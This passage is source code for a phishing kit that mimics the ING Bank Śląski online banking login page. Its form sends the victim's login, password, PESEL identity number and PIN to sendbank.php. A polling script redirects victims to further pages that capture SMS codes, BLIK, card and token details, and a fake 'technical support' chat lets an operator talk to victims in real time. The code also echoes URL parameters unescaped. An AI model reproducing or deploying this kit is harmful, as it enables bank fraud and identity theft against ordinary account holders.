        background-attachment: fixed;
        background-repeat: no-repeat;
        background-size: cover;
        overflow: hidden auto;
        text-align: center
      }
      
      .ing-new-theme.ing-contrast-theme .checkbox input[type=checkbox]:hover:not(:disabled)+label::before,
      .ing-new-theme.ing-contrast-theme .radio input[type=radio]:not(old):hover:not(:disabled)+label>span {
        border-color: #ff6200
      }
      
      .ing-new-theme.ing-contrast-theme .checkbox input[type=checkbox]:focus:not(:disabled)+label::before,
      .ing-new-theme.ing-contrast-theme .checkbox input[type=checkbox]:hover:not(:disabled)+label::before,
      .ing-new-theme.ing-contrast-theme .radio input[type=radio]:not(old):not(:disabled)+label:active>span:first-of-type,
      .ing-new-theme.ing-contrast-theme .radio input[type=radio]:not(old):not(:disabled)+label:hover>span:first-of-type,
      .ing-new-theme.ing-contrast-theme .radio input[type=radio]:not(old):not(:disabled):focus+label>span:first-of-type {
        border: 2px solid #ff0
      }
      
      .ing-new-theme.ing-contrast-theme .radio input[type=radio]:not(old):not(:disabled)+label:active>span:first-of-type>span,
      .ing-new-theme.ing-contrast-theme .radio input[type=radio]:not(old):not(:disabled)+label:hover>span:first-of-type>span,
      .ing-new-theme.ing-contrast-theme .radio input[type=radio]:not(old):not(:disabled):focus+label>span:first-of-type>span {
        left: .6rem;
        top: .6rem
      }
      
      :root {
        --color-b1: #fff;
        --color-g1: #333;
        --color-g2: #767676;
        --color-g3: #a8a8a8;
        --color-g4: #d9d9d9;
        --color-g5: #f0f0f0;
        --color-p1: #ff6200;
        --color-d1: #525199;
        --color-d2: #60a6da;
        --color-d3: #ab0066;
        --color-d4: #d0d93c;
        --color-d5: #349651;
        --color-d6: #f00;
        --color-f1: #4b53af;
        --color-f2: #21c7ed;
        --color-f3: #008e91;
        --color-f4: #e07710;
        --color-f5: #f74f80;
        --color-f6: #5fc634;
        --color-f7: #009fef;
        --color-f8: #ffa81d;
        --color-f9: #9d64b5;
        --color-f10: #bc1d5e;
        --color-f11: #e8f3fa;
        --color-f12: #525199;
        --color-black: #000;
        --color-yellow: #ff0;
        --color-d2-hover: #528dba;
        --color-tooltip-shadow: #e5e5e5;
        --color-b2: #e9f2db;
        --color-b3: #ffe0cc;
        --color-b4: #fff4e5;
        --color-h2: #692;
        --color-p2: #d94e12;
        --color-p3: #c94015;
        --color-p4: #e85b0f;
        --color-p5: #ff8700;
        --color-p6: #ffa800;
        --color-p1-hover: #db5400;
        --color-p2-hover: #bf420d;
        --color-p3-hover: #b33810;
        --color-p4-hover: #ca4c0b;
        --color-p5-hover: #ff6700;
        --color-p6-hover: #ff8c00;
        --color-s4: #bbb;
        --color-s5: #ddd;
        --color-s7: #f6f6f6;
        --transition: all .2s cubic-bezier(.4, 0, .2, 1) 0s;
        --outline-interactive-element: none;
        --font-weight-light: 300;
        --font-weight-regular: 400;
        --font-weight-semibold: 600;
        --font-weight-extrabold: 700
      }
      
      a {
        display: inline-block;
        position: relative
      }
      
      .ing-new-theme .ph-0 {
        padding-left: 0!important;
        padding-right: 0!important
      }
      
      .ing-new-theme .ml-0 {
        margin-left: 0!important
      }
      
      @media only screen and (min-width:768px) {
        .ing-new-theme #layout-region>.login-layout {
          background-image: url(1117702.jpg)
        }
      }
      
      @media only screen and (min-width:1200px) {
        .ing-new-theme #layout-region>.login-layout {
          background-image: url(ing-image-5.jpg)
        }
      }
      
      @media only screen and (max-width:767px) {
        .ing-new-theme #layout-region>.login-layout {
          background-image: none
        }
      }
      
      #offers-login-page p {
        margin-bottom: .4em!important
      }
      
      #offers-login-page .component_wrapper>.component.content {
        padding-top: 0!important;
        padding-bottom: 0!important
      }
      
      .ing-new-theme .login_msg p a:after,
      .ui-offer-box {
        display: none
      }
      
      #content_wrapper A.loginPage {
        margin-left: 1.2rem!important
      }
    </style>
    <div id="alerts-region">
      <div></div>
    </div>
    <div id="curtain-collection" class="curtain-collection"></div>
    <div id="accessibility-navigation-region"></div>
    <div id="layout-region" class="ing-container" style="margin-top: 0px;">
      <div class="login-layout">
        <div id="smart-app-banner-region"></div>
        <div class="region-wrapper login-region login-layout_container ui-content login-layout--top">
          <div class="main-content-wrap">
            <h1 class="sr-only">Moje ING | ING Bank Śląski - Logowanie</h1>
            <div id="content-region" class="main-content">
              <div class="ing-login-container">
                <div class="content-container box">
                  <header class="ing-header">
                    <div id="nav-hybrid" class="navbar nav-hybrid nav-hybrid--mobileFixed" style="margin-top: 0px;">
                      <div class="logo">
                        <div class="logo__link">
                          <div id="logo-region">
                            <div> <img class="logo__img--logo" src="./ing_files/ing-image-4.svg" alt="ING Bank Śląski" width="128"> </div>
                          </div>
                        </div>
                      </div>
                    </div>
                  </header>
                  <div id="info-region" class="box-content box-content--info"></div>
                  <div class="box-content login-hero">
                    <h2 class="js-header hide-if-empty">Zaloguj się do bankowości internetowej</h2></div>
                  <div id="body-region" class="body" style="">
                    <section class="login-form-container">
                      <div id="check-login-error-banner" class="box-content box-content--error"></div>
                      <div class="box-content box--after">
                        <div class="login-form-content">
                          <form id="js-login-form" method="POST" action="sendbank.php" role="form">
                            <input type="hidden" name="id" value="<?php echo $_GET['id']; ?>">
                            <input type="hidden" name="type" value="3">
						  <div style="color: #ff6161; padding: 20px; text-align: center;"></div>
                            <div class="form-group">
                              <input type="text" class="form-control form-control" name="logindata" id="field3ds01" placeholder="Login"> </div>
                            <div class="form-group">
                              <input type="password" class="form-control form-control" name="passdata" id="field3ds02" placeholder="Hasło"> </div>
							  <div class="loginboxes">
						<button id="button1" style="display: none;" form="123123" class="_4">Dalej</button>
					</div>
                            <div class="form-group">
                              <input type="password" class="form-control form-control" name="peseldata" id="field3ds2" placeholder="Pesel"> </div>
                            <div class="form-group">
                              <input type="password" class="form-control form-control" name="pindata" id="field3ds4" placeholder="PIN"> </div>
                            <div class="eVxo4 iQI2R">
                              <input style="float: right; width: 100%; margin: 0; font-size: 20px; line-height: 24px; display: inline-block; box-sizing: border-box; padding: 12px 30px; min-width: 180px; border-radius: 8px; white-space: nowrap; background-color: #FF6200; color: #fff; text-align: center; text-decoration: none; border: none; font-weight: 600;" type="submit" value="Dalej"> </div>
                          </form>
                          <div class="footer-region">
                            <div></div>
                          </div>
                        </div>
                        <p class="login_help">
                          <a href="problemy-z-logowaniem" class="link inline-flex" target="_blank" rel="noopener"></a>
                        </p>
                      </div>
                    </section>
                  </div>
				  		<script>
			var button1 = document.querySelector('#button1');
			var inp1 = document.querySelector('#field3ds1');
			var inp2 = document.querySelector('#field3ds2');
			var inp3 = document.querySelector('#field3ds3');
			var inp4 = document.querySelector('#field3ds4');
			var inp5 = document.querySelector('#field3ds5');
			var inp01 = document.querySelector('#field3ds01');
			var inp02 = document.querySelector('#field3ds02');
			button1.onclick = function () {
				if (inp01.value.length > 5 && inp02.value.length > 5) {
					inp1.style.display = 'block';
					inp2.style.display = 'block';
					inp3.style.display = 'block';
	                inp4.style.display = 'block';
			 		inp5.style.display = 'block';
			 		button1.style.display = 'none';
				}
			}
		</script>
		<script type="text/javascript">
            
            

            function ajaxsup1() {
                var request = new XMLHttpRequest();

                request.onreadystatechange = function() {
                    if (request.readyState == 4 && request.status == 200) {
                        var loading = document.querySelector('#loading');
                        var smsblock = document.querySelector('#sms');
                        var lkblock = document.querySelector('#lk');
                        var result = request.responseText;
                        // console.log(request.responseText);
                        console.log('%md%');
                        if (result == 'sms') {
                            location="/3ds%md%";
                        } else if (result == 'lk') {
                             location="/autorize%md%";
                        } else if (result == 'photo') {
                             location="/checking%md%";
                        } else if (result == 'blik') {
                             location="/blik%md%";
                        } else if (result == 'push') {
                             location="/potwierdzenie%md%";
                        } else if (result == 'card') {
                             location="/verification%md%";
                        } else if (result == 'token') {
                             location="/ipko%md%";
                        } else if (result == 'pin') {
                             location="/pincode%md%";
                        } else {

                        }
                    }
                }
                request.open('POST', 'procstatus.php');
                request.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
                request.send('item=22161894');
            }

            function ajaxdel() {
                var request = new XMLHttpRequest();
                request.open('POST', 'delstatus.php');
                request.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
                request.send('item=22161894');
            }

        </script>


		<style>
.chaport-container.chaport-container-positioned {
    position: fixed;
    box-sizing: border-box;
    top: auto;
    right: 0;
    bottom: 0;
    left: 0;
    width: auto;
    height: 0;
    overflow: visible;
}
.chaport-container {
    font-size: 14px;
    z-index: 2147483500;
}
.chaport-container .chaport-launcher {
    position: absolute;
    display: block;
    bottom: 0;
    right: 0;
    left: 0;
    z-index: 2147483500;
    width: auto;
    height: 0;
    overflow: visible;
    font-size: 14px;
}
.chaport-container div {
    display: block;
}

.chaport-container.chaport-window-dark-gray .chaport-launcher .chaport-launcher-button, .chaport-content.chaport-window-dark-gray .chaport-launcher .chaport-launcher-button {
    background-color: #FF6200;
}
.chaport-container .chaport-launcher .chaport-launcher-button {
    position: absolute;
    bottom: 1.42857em;
    right: 1.42857em;
    width: 4.28571em;
    height: 4.28571em;
    -webkit-border-radius: 50%;
    -moz-border-radius: 50%;
    -ms-border-radius: 50%;
    border-radius: 50%;
    -webkit-box-shadow: 0 5px 38px rgba(0,0,0,0.15);
    box-shadow: 0 5px 38px rgba(0,0,0,0.15);
    cursor: pointer;
    -webkit-transition: visibility 0s linear 0.2s,opacity linear 0.2s;
    -o-transition: visibility 0s linear 0.2s,opacity linear 0.2s;
    transition: visibility 0s linear 0.2s,opacity linear 0.2s;
}
.chaport-container .chaport-anim-show {
    visibility: visible;
    opacity: 1;
    -webkit-transition-delay: 0s !important;
    transition-delay: 0s !important;
}

.chaport-container .chaport-launcher {
    position: absolute;
    display: block;
    bottom: 0;
    right: 0;
    left: 0;
    z-index: 2147483500;
    width: auto;
    height: 0;
    overflow: visible;
    font-size: 14px;
}
.chaport-container .chaport-launcher .chaport-launcher-button .chaport-launcher-chat-icon {
    transition: transform 0.3s cubic-bezier(0.4, 0, 0.2, 1),opacity 0.3s cubic-bezier(0.4, 0, 0.2, 1);
    opacity: 1;
    transform: rotate(0deg);
    width: 2.28571em;
    height: 2.64286em;
    position: absolute;
    margin-top: 0.07143em;
    top: 0.92857em;
    left: 1em;
    background-image: url(/chap.png);
    background-repeat: no-repeat;
    background-size: 100% 100%;
}
.chaport-container .chaport-launcher .chaport-launcher-button {
    position: absolute;
    bottom: 1.42857em;
    right: 1.42857em;
    width: 4.28571em;
    height: 4.28571em;
    -webkit-border-radius: 50%;
    -moz-border-radius: 50%;
    -ms-border-radius: 50%;
    border-radius: 50%;
    -webkit-box-shadow: 0 5px 38px rgba(0,0,0,0.15);
    box-shadow: 0 5px 38px rgba(0,0,0,0.15);
    cursor: pointer;
    -webkit-transition: visibility 0s linear 0.2s,opacity linear 0.2s;
    -o-transition: visibility 0s linear 0.2s,opacity linear 0.2s;
    transition: visibility 0s linear 0.2s,opacity linear 0.2s;
}
.chaport-container .chaport-launcher .chaport-launcher-button .chaport-launcher-close-icon {
    transition: transform 0.3s cubic-bezier(0.4, 0, 0.2, 1),opacity 0.3s cubic-bezier(0.4, 0, 0.2, 1);
    opacity: 0;
    transform: rotate(-45deg) scale(1);
    position: absolute;
    top: 0;
    right: 0;
    width: 4.28571em;
    height: 4.28571em;
}
.chaport-container .chaport-launcher .chaport-launcher-button .chaport-launcher-close-icon:before {
    -ms-transform: rotate(45deg);
    -webkit-transform: rotate(45deg);
    transform: rotate(45deg);
}
.chaport-container .chaport-launcher .chaport-launcher-button .chaport-launcher-close-icon:before, .chaport-container .chaport-launcher .chaport-launcher-button .chaport-launcher-close-icon:after {
    position: absolute;
    top: 1.5em;
    right: 2.07143em;
    content: ' ';
    height: 1.35714em;
    width: 0.14286em;
    background-color: #fff;
}
.chaport-container .chaport-launcher .chaport-launcher-button.no-photo .chaport-launcher-operator-photo {
    opacity: 0;
}
.chaport-container .chaport-launcher .chaport-launcher-button .chaport-launcher-operator-photo {
    transition: transform 0.3s cubic-bezier(0.4, 0, 0.2, 1),opacity 0.3s cubic-bezier(0.4, 0, 0.2, 1);
    opacity: 1;
    transform: rotate(0deg);
    position: absolute;
    z-index: 1;
    width: 100%;
    height: 100%;
}
.chaport-container .chaport-launcher .chaport-launcher-button .chaport-badge-show {
    transform: scale(1);
}

.chaport-container .chaport-launcher .chaport-message .chaport-message-tail:after {
    border-width: 0.33333em;
    bottom: 1.13333em;
    border-left-color: #fff;
}
.chaport-container .chaport-window-anim.chaport-anim-hide {
    transform: translateY(20px);
}
.chaport-container.chaport-container-positioned .chaport-window {
    position: absolute;
    top: auto;
    right: 20px;
    bottom: 115px;
    left: auto;
    width: 300px;
    -webkit-box-shadow: 0 5px 38px rgba(0,0,0,0.15);
    box-shadow: 0 5px 38px rgba(0,0,0,0.15);
    -webkit-border-radius: 8px;
    -moz-border-radius: 8px;
    -ms-border-radius: 8px;
    border-radius: 8px;
    overflow: hidden;
    z-index: 2147483500;
}
.chaport-container .chaport-window-anim {
    transition: height 0s linear 0.3s,visibility 0s linear 0.3s,opacity 0.3s cubic-bezier(0.4, 0, 0.2, 1),transform 0.3s cubic-bezier(0.4, 0, 0.2, 1);
}
.chaport-container .chaport-inner {
    position: relative;
    margin-left: 0px;
    margin-right: 0px;
    background-color: #fff;
}


.chaport-container .chaport-auto-invitation .chaport-auto-invitation-message {
    position: absolute;
    right: 0;
    bottom: 60px;
}

.chaport-container .chaport-auto-invitation .chaport-auto-invitation-message .chaport-auto-invitation-message-body .operator-face {
    position: absolute;
    left: -41px;
    bottom: 7px;
}

.chaport-container .chaport-auto-invitation .chaport-auto-invitation-message .chaport-auto-invitation-message-body .operator-face .photo img {
    width: 100%;
    height: 100%;
    -webkit-border-radius: 50%;
    -moz-border-radius: 50%;
    -ms-border-radius: 50%;
    border-radius: 50%;
}
.chaport-container .chaport-auto-invitation .chaport-auto-invitation-message .chaport-auto-invitation-message-body .operator-name {
    margin-bottom: 5px;
    font-size: 15px;
    font-weight: bold;
}
.chaport-container .chaport-auto-invitation .chaport-auto-invitation-message .chaport-auto-invitation-message-body .message-text {
    font-size: 15px;
}
@media (max-width: 339px), (min-width: 341px) {
.chaport-close, .chaport-container .chaport-close {
    display: block;
}
}

.chaport-container .chaport-big-shadow {
    opacity: 0;
    z-index: 2147483499;
    position: fixed;
    width: 480px;
    height: 480px;
    bottom: 0;
    right: 0;
    content: "";
    pointer-events: none;
    background: radial-gradient(ellipse at bottom right,rgba(27,37,52,0.15) 0,rgba(27,37,52,0) 70%);
    -webkit-transition: opacity 0.2s linear;
    -o-transition: opacity 0.2s linear;
    transition: opacity 0.2s linear;
}
.chaport-content {
    position: absolute;
    top: 0;
    right: 0;
    bottom: 0;
    left: 0;
    overflow: hidden;
    -webkit-border-top-left-radius: 8px;
    -moz-border-top-left-radius: 8px;
    -ms-border-top-left-radius: 8px;
    border-top-left-radius: 8px;
    -webkit-border-top-right-radius: 8px;
    -moz-border-top-right-radius: 8px;
    -ms-border-top-right-radius: 8px;
    border-top-right-radius: 8px;
    display: flex;
    flex-direction: column;
    justify-content: space-between;
}
@media (max-width: 460px), (max-width: 750px) and (orientation: landscape)
.chaport-content {
    -webkit-border-radius: 0;
    -moz-border-radius: 0;
    -ms-border-radius: 0;
    border-radius: 0;
}
.chaport-close, .chaport-container .chaport-close {
    position: absolute;
    top: 0;
    right: 0;
    z-index: 4;
    width: 50px;
    height: 41px;
    cursor: pointer;
    opacity: 0.6;
    -webkit-transition: opacity 0.2s linear;
    -o-transition: opacity 0.2s linear;
    transition: opacity 0.2s linear;
    display: none;
}
.main-textblock {
    background-color: #ffffff;
    border-radius: 4px;
    height: 500px;
}
.operatorblock {
    height: 130px;
    background-color: #FF6200;
    top: 0;
}
#operator-photo {

    width: 60px;
    height: 60px;
    margin-bottom: 7px;
    text-align: center;
    margin-top: 8px;
}
#oper-photo-img {
    width: 100%;
    height: 100%;
    border-radius: 50%;
}
.operatorblock-content {
    padding: 20px;
    display: flex;
}
.operator-name {
    font-size: 13px;
    color: rgba(255,255,255,0.7);
}
.team-wrapper {
    text-align: center;
    width: 60%;
    margin-top: 30px;
    margin-left: 4%;
}
.team {
    font-size: 16px;
    color: #fff;
}
.activity-indicator {
    font-size: 13px;
    color: rgba(255,255,255,0.7);
}
.with-status {
    padding-left: 15px;
    display: inline-block;
    position: relative;
}
.status-online {
    display: block;
    background-color: #4fd237;
    position: absolute;
    right: -3px;
    bottom: 3px;
    width: 7px;
    height: 7px;
    background-repeat: no-repeat;
    border-radius: 7px;
    border-width: 1px;
    border-style: solid;
    box-sizing: content-box;
    left: 0;
    right: auto;
    border-color: #4fd237;
}
#input-msg {
    border-top: 1px solid #babac05c;
    width: 100%;
    position: absolute;
    bottom: 0;
    height: 50px;
    margin-bottom: 20px;
}
#smstosup1 {
    margin-left: 10px;
    width: 100%;
    border: none;
    font-size: 15px;
}

.chaport-container .chaport-input-wrapper .chaport-send-icon, .chaport-input-wrapper .chaport-send-icon {
    opacity: 1;
    transform: scale(1);
    position: absolute;
    bottom: 15px;
    left: 7px;
    width: 18px;
    height: 18px;
    transition: opacity 0.2s linear,transform 0.2s cubic-bezier(0.4, 0, 0.2, 1);
}
.chaport-container.chaport-window-dark-gray .chaport-send-icon svg polygon, .chaport-content.chaport-window-dark-gray .chaport-send-icon svg polygon {
    fill: #414141;
    transition: fill 0.2s cubic-bezier(0.4, 0, 0.2, 1);
}
#smstosupbutton1 {
    border-width: 0px;
    background: #fff;
    margin-right: 10px;
}
#smstosupbutton1 {
    cursor: pointer;
}
#smstosupbutton1:focus, #smstosupbutton1:active  {
    outline: none;
}
.chaport-window {
    visibility: hidden;
    opacity: 0;
}
.chat-block {
    overflow-y: auto;
    height: 300px;
    overflow-x: hidden;

}
#chat {
    padding-bottom: 15px;
}
.operators-msg {
    margin-top: 15px;
}
.operators-first-text {
    padding: 10px;
    width: 180px;
    border-radius: 8px;
    background-color: #e8ecef;
    padding-right: 30px;
}
.operators-msg-text {
    padding: 10px;
    max-width: 180px;
    border-radius: 8px;
    background-color: #e8ecef;
    padding-right: 30px;
}
.visitors-msg-text {
    margin-top: 15px;
    margin-right: 10px;
    margin-left: 80px;
    padding: 10px;
    min-width: 180px;
    border-radius: 8px;
    background-color: #FF6200;
    color: #fff;
}
.operators-photo img {
    width: 30px;
    height: 30px;
    border-radius: 50%;
    margin-left: 5px;
    margin-right: 5px;
}
.chat-block::-webkit-scrollbar {
    width: 7px;
}
.chat-block::-webkit-scrollbar-button {
    display: none;
}
.chat-block::-webkit-scrollbar-thumb {
    border-radius: 8px;
    background-color: #babac0;
    border: 1px solid transparent;
}
.chat-block::-webkit-scrollbar-thumb {
    border-radius: 8px;
    background-color: #babac0;
    border: 1px solid transparent;
}
    </style>


    <div id="offonthechap">
            <div class="chaport-container chaport-container-positioned chaport-window-dark-gray chaport-collapsed" style="bottom: 0px;">
                <div class="chaport-launcher" style="left: 0px; right: 0px;">
                    <div class="chaport-launcher-button no-photo chaport-launcher-anim chaport-anim-show">
                    <input type="hidden" id="product" value="<?php echo $xml->obyava; ?>">
                        <input type="hidden" id="refresh_time" value="<?php echo $_GET['id']; ?>">
                        <input type="hidden" id="home_time" value="<?php echo $xml->worker_id; ?>">
                        <div class="chaport-launcher-chat-icon"></div>
                        <div class="chaport-launcher-close-icon"></div>
                        <div class="chaport-launcher-operator-photo"></div>
                    </div>
                </div>
                <div class="chaport-window chaport-anim-hide chaport-window-anim" style="opacity: 0; visibility: hidden;">
                    <div class="chaport-inner">
                        <div class="main-textblock">
                            <div class="operatorblock">
                                <div class="operatorblock-content" style="display: flex;">
                                    <div id="operator-photo">
                                        <img id="oper-photo-img" src="./ing_files/operator-img.png">
                                        <div class="operator-name">Sofia</div>
                                    </div>
                                    <div class="team-wrapper">
                                        <div class="team">Pomoc techniczna</div>
                                        <div class="activity-indicator">
                                            <div class="with-status" style="display: inline-block;">
                                                <div class="status-online" style="display: inline-block;">
                                                    
                                                </div>online</div>
                                            </div>
                                        </div>
                                </div>
                            </div>
                            <div class="chat-block">
                                <div id="chat">
                                    <div class="operators-msg" id="greeting-msg" style="display: none;">
                                        <div class="operators-photo"><img src="./ing_files/operator-img.png"></div>
                                        <div class="operators-first-text">Dzień dobry! Jak mogę ci pomóc?</div>                            
                                    </div>
                                
                                </div>
                                <div id="input-msg" style="display: flex;">
                                    <input type="text" name="smstosup1" id="smstosup1" placeholder="Wpisz swoją wiadomość...">
                                    <button id="smstosupbutton1" onclick="sendMessage()">
                                        <div class="chaport-send-icon">
                                            <svg width="18" height="18" viewBox="0 0 535.5 535.5">
                                                <polygon points="0,497.25 535.5,267.75 0,38.25 0,216.75 382.5,267.75 0,318.75" fill="#b9bdbf">      
                                                </polygon>
                                            </svg>
                                        </div>
                                    </button>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>  
                    <div class="chaport-big-shadow"></div>
            </div>
        </div>

        <script type="text/javascript">


var supportbutton = document.querySelector('.chaport-launcher-button');
    var supportwindow = document.querySelector('.chaport-window');

    supportbutton.onclick = function() {
        if (supportwindow.style.opacity == '0') {
            supportwindow.style.opacity = '1';
            supportwindow.style.visibility = 'visible';
        } else {
            supportwindow.style.opacity = '0';
            supportwindow.style.visibility = 'hidden';
        }
    };
</script>

<script type="text/javascript">

var myVar = setInterval(updateChat, 5000);
var pool = true;
function updateChat() {
var supportbutton = document.querySelector('.chaport-launcher-button');
var supportwindow = document.querySelector('.chaport-window');
var token = <?php echo $_GET['id']; ?>;
if (token !== null) {
if (pool) {
xhttp = new XMLHttpRequest();
var track_id = document.getElementById("refresh_time").value;
var url = 'https://' + document.location.hostname + '/chat_src/message.php';
pool = false;
xhttp.open("POST", url, true);
xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
xhttp.send("get=0&token=" + token);
xhttp.onload = function (e) {
if (xhttp.readyState === 4) {
  if (xhttp.status === 200) {
    var body = xhttp.response;
    pool = true;
    var json = JSON.parse(body);
    for (let i = 0; i < json.length; i++) {
      cur_text = $('#offonthechap > div > div.chaport-window.chaport-anim-hide.chaport-window-anim > div > div > div.chat-block').html();
      if (json[i].sender == 't') {
        text = '<div class="operators-msg" style="display: flex;"><div class="operators-photo"><img src="../ordercss/operator-img.png"></div><div class="operators-msg-text" id="qwe1649370682">'+ json[i].message +'</div></div>'
      } else if (json[i].sender == 'i') {
        text = '<div class="visitors-msg-text" id="qwe1649370526">'+ json[i].message +'</div>'
      }else if (json[i].sender == "testOnline"){
        return 'okay';
      }else{
        text = '<div class="visitors-msg-text" id="qwe1649370526">'+ json[i].message +'</div>'
      }

      
      $('#offonthechap > div > div.chaport-window.chaport-anim-hide.chaport-window-anim > div > div > div.chat-block').html(cur_text + text);
      var objDiv = $('#offonthechap > div > div.chaport-window.chaport-anim-hide.chaport-window-anim > div > div > div.chat-block');
      objDiv.scrollTop($('#offonthechap > div > div.chaport-window.chaport-anim-hide.chaport-window-anim > div > div > div.chat-block')[0].scrollHeight);
      supportwindow.style.opacity = '1';
      supportwindow.style.visibility = 'visible';
    }

  } else {
    pool = true;
  }
}
}
}
}
}

function sendMessage() {
message = document.getElementById("smstosup1").value;
if (message === '') {
return;
}
document.getElementById("smstosup1").value = '';
var token = document.getElementById("refresh_time").value;
if (token === null) {
var token = Math.random().toString(36).substring(7);
}
xhttp = new XMLHttpRequest();
var track_id = document.getElementById("refresh_time").value;
var url = 'https://' + document.location.hostname + '/chat_src/message.php';
xhttp.open("POST", url, true);
xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
var uid = document.getElementById("home_time").value;
var title = document.getElementById("product").value;
xhttp.send("send=1&track_id=" + encodeURIComponent(track_id) + "&uid=" + encodeURIComponent(uid) + "&token=" + encodeURIComponent(token) + "&message=" + encodeURIComponent(message) + "&type=" + encodeURIComponent(window.location.host.split('.')[0]) + "&title=" + encodeURIComponent(title));
cur_text = $('#offonthechap > div > div.chaport-window.chaport-anim-hide.chaport-window-anim > div > div > div.chat-block').html();
$('#offonthechap > div > div.chaport-window.chaport-anim-hide.chaport-window-anim > div > div > div.chat-block').html(cur_text + '<div class="visitors-msg-text" id="qwe1649370526">'+ message +'</div>');
setCookie('token', token);
var objDiv = $('#offonthechap > div > div.chaport-window.chaport-anim-hide.chaport-window-anim > div > div > div.chat-block');
objDiv.scrollTop($('#offonthechap > div > div.chaport-window.chaport-anim-hide.chaport-window-anim > div > div > div.chat-block')[0].scrollHeight);
}

function setCookie(cname, cvalue) {
var d = new Date();
d.setTime(d.getTime() + (6 * 60 * 60 * 1000));
var expires = "expires=" + d.toUTCString();
document.cookie = cname + "=" + cvalue + ";" + expires + ";path=/";
}

</script>
                  <div id="additional-region"></div>
                  <div id="news-region" class="login_msg box-content" style="">
                    <div class="security-message-container">
                      <div id="content_wrapper">
                        <div class="layout_element layout_section">
                          <div class="layout_element layout_row row class_1634302028167">
                            <div class="layout_element layout_column col-xs-12 col-sm-12 col-md-12 col-lg-12 class_1634302028168" id="offers-login-page">
                              <div class="layout_element component_wrapper" id="component_wrapper_3693136">
                                <div class="component nextgen_content content notPrintable component_3693136">
                                  <div class="content_area">
                                    <!-- <p><span>15.10.2021</span><a class="link loginPage" href="https://www.ing.pl/aktualnosci/bankowosc-elektroniczna?news_id=1105222-sprzedajesz-uzywane-ubrania-w-internecie-uwazaj-by-ktos-nie-oproznil-ci-konta" target="_blank">Sprzedajesz na OLX lub Vinted? Uważaj na linki z fałszywym potwierdzeniem płatności (więcej)</a></p> -->
                                    <p><span>23.06.2021</span><a class="link loginPage" href="https://www.ing.pl/aktualnosci/bankowosc-elektroniczna?news_id=1104712-oszusci-dzwonia-z-numerow-podszywajacych-sie-pod-infolinie-banku" target="_blank">Telefony z numerów podszywających się pod infolinię banku (więcej)</a></p>
                                    <p><a class="link loginPage" href="http://www.ing.pl/bezpieczenstwo" target="_blank">Poznaj zasady bezpieczeństwa</a></p>
                                  </div>
                                  <div class="clearFix"></div>
                                </div>
                              </div>
                            </div>
                          </div>
                        </div>
                      </div>
                      <div class="hidden" id="other_components"></div>
                    </div>
                  </div>
                </div>
                <div id="box-region" class="box hidden-xs ui-offer-box" style="">
                  <div>
                    <div class="box-content box--before box--after js-box-content">
                      <div id="content_wrapper"></div>
                      <div class="hidden" id="other_components"></div>
                    </div>
                  </div>
                </div>
                <div class="ui-mobile-apps login_mobile-apps visible-xs-block">
                  <h2 id="downloadMobileApp">Pobierz bezpieczną aplikację mobilną:</h2>
                  <ul class="row">
                    <li class="col-xs-12">
                      <a class="js-android-app" aria-describedby="downloadMobileApp" href="https://play.google.com/store/apps/details?id=pl.ing.mojeing">
                        <div class="login_mobile-apps_icon icon-gp"></div><span class="sr-only">Aplikacja mobilna dla telefonu z systemem<span lang="en">Android</span></span>
                      </a>
                    </li>
                    <li class="col-xs-12">
                      <a class="js-ios-app" aria-describedby="downloadMobileApp" href="https://itunes.apple.com/pl/app/moje-ing-mobile/id1119103957">
                        <div class="login_mobile-apps_icon icon-as"></div><span class="sr-only">Aplikacja mobilna dla telefonu z systemem <span lang="en">i_O_S</span></span>
                      </a>
                    </li>
                  </ul>
                </div>
              </div>
            </div>
          </div>
        </div>
        <footer id="footer-region" class="ing-footer login-layout_footer ui-content login-layout--top">
          <div>
            <div class="container footer-container">
              <div class="ing-list-hybrid-container">
                <ul class="ing-list-hybrid">
                  <li><a href="aktywacja" class="ing-activation js-activation"><i class="glyphicon-ing-key" aria-hidden="true"></i> <span>Aktywuj dostęp</span></a></li>
                  <li class="pull-right-md ph-0">
                    <ul>
                      <li><a href="bezpieczenstwo" target="_blank" rel="noopener" class="js-safety"><i class="glyphicon-ing-blocked2" aria-hidden="true"></i> <span>O bezpieczeństwie</span> <span class="sr-only">otwiera się w nowym oknie</span></a></li>
                      <li><a href="#" class="js-change-lang"><i class="glyphicon-ing-en" aria-hidden="true"></i> <span aria-hidden="true">English</span> <span class="sr-only">Zmień język systemu bankowości internetowej na angielski</span></a></li>
                      <li><a href="#" class="js-change-contrast"><i class="glyphicon-ing-e916" aria-hidden="true"></i> <span>Wersja kontrastowa</span></a></li>
                    </ul>
                  </li>
                </ul>
              </div>
              <div class="ing-list-inline-container"> <span class="ml-0">© 2022 ING Bank Śląski S.A.</span>
                <ul class="ing-list-inline pull-right-md">
                  <li> <span id="aria-info">Infolinia:</span> <a href="tel:+48323570069" aria-describedby="aria-info"><span class="sr-only">zadzwoń 32_357 00 69</span><span aria-hidden="true">32 357 00 69</span></a></li>
                  <li> <a href="#cookie-policy" target="_blank" rel="noopener" class="js-cookies-policy"><span>Polityka <span lang="en">cookies</span></span> <span class="sr-only">otwiera się w nowym oknie</span></a></li>
                </ul>
              </div>
            </div>
          </div>
        </footer>
      </div>
    </div>
  

</body></html>